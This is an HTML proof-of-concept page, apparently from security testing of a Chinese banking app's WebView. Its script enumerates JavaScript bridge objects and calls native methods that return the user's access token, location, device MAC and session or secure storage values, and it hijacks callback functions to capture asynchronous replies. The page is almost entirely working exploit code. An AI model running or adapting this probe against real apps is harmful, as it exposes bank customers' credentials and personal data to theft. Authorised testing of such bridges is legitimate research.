<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>ZGC_POC probe</title>
<style>
body { font-family: monospace; font-size: 14px; background: #fff; color: #111; padding: 12px; }
h2 { color: #c00; }
pre { white-space: pre-wrap; word-break: break-all; background: #f4f4f4; padding: 8px; border: 1px solid #ccc; }
</style>
</head>
<body>
<h2>ZGC_POC JSBridge Probe</h2>
<div>如果此页面显示在银行APP内, 说明任意HTTPS页面渲染成功; 下方为JSBridge枚举结果。</div>
<pre id="out">scanning...</pre>
<script>
(function () {
    var out = [];
    function log(s) { out.push(s); render(); }
    function render() {
        var t = out.join('\n');
        document.getElementById('out').textContent = t;
        document.title = 'PROBE[' + out.length + ']';
    }

    // 1. 全局对象模糊枚举
    var hits = [];
    try {
        for (var k in window) {
            if (/bridge|js|android|exchange|oxweb|tdbridge|madp|engine|csii|nbs|app/i.test(k)) {
                hits.push(k + '(' + (typeof window[k]) + ')');
            }
        }
    } catch (e) { log('enum err: ' + e); }
    log('[window keys] ' + (hits.length ? hits.join(', ') : '(none)'));

    // 2. 已知/疑似 bridge 名称精确探测并列出方法
    var names = ['Verification', 'verification', 'jsExchange', 'androidToJS', 'AndroidToJS', 'androidToJs', 'android',
                 'oxWeb', 'TDBridge', 'NBSJSBridge', 'nbsJsBridge', 'NebulaJsBridge',
                 'bankJSBridge', 'zgcBridge', 'appBridge', 'JsToApp'];
    for (var i = 0; i < names.length; i++) {
        var n = names[i];
        try {
            if (window[n]) {
                var ms = [];
                for (var m in window[n]) { ms.push(m); }
                log('[FOUND] ' + n + ' -> ' + (ms.length ? ms.join(',') : '(no enumerable props)'));
            }
        } catch (e) { log('[probe ' + n + '] err: ' + e); }
    }

    // 3. 只读型高危方法实测(返回值/回调名都打印)
    function tryCall(obj, path) {
        try {
            var o = obj;
            var parts = path.split('.');
            for (var j = 0; j < parts.length; j++) { o = o[parts[j]]; }
            if (typeof o === 'function') {
                var r = o.call(obj);
                log('[CALL] ' + path + '() => ' + r);
            } else {
                log('[CALL] ' + path + ' not function: ' + typeof o);
            }
        } catch (e) {
            log('[CALL] ' + path + ' err: ' + e);
        }
    }
    if (window.Verification) {
        tryCall(window.Verification, 'nativeWebGetAccessToken');
        tryCall(window.Verification, 'nativeWebGetUserLocation');
        tryCall(window.Verification, 'nativeWebGetAppMac');
        tryCall(window.Verification, 'nativeWebContextSessionGet');
        tryCall(window.Verification, 'nativeWebContextSecureGet');
    }
    if (window.jsExchange) {
        tryCall(window.jsExchange, 'nativeWebGetAccessToken');
        tryCall(window.jsExchange, 'nativeWebGetUserLocation');
        tryCall(window.jsExchange, 'nativeWebGetAppMac');
        tryCall(window.jsExchange, 'nativeWebContextSessionGet');
        tryCall(window.jsExchange, 'nativeWebContextSecureGet');
    }
    if (window.androidToJS) {
        tryCall(window.androidToJS, 'nativeWebCheckDeviceAuth');
    }

    // 4. 全局回调捕获: 若 bridge 用 callBackToJS 异步回传, 劫持常见回调名
    window.callbackToJS = function () {
        log('[callbackToJS] ' + JSON.stringify(arguments));
    };
    window.callBackToJS = window.callbackToJS;

    log('[done] probe finished');
})();
</script>
</body>
</html>
